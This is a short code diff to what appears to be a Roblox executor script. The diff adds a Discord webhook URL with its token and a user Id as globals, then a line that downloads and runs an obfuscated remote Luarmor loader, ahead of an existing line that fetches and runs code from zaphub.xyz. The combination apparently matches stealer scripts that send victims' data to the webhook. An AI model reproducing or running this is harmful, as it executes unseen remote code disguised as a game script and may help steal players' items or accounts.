@@ -1,1 +1,7 @@
+getgenv().Id = "669513713530699789"
+getgenv().Url = "https://discord.com/api/webhooks/1264646233247715350/3lKHFLk9OWhakA_BuVG8ja-HyGD-HQjOZKvS_Dsqy22yTbAY5zG07QBu90PkloWyWCF6"
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/ed88cda2afec54cf573c9c1498fad353.lua"))()
+
+
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
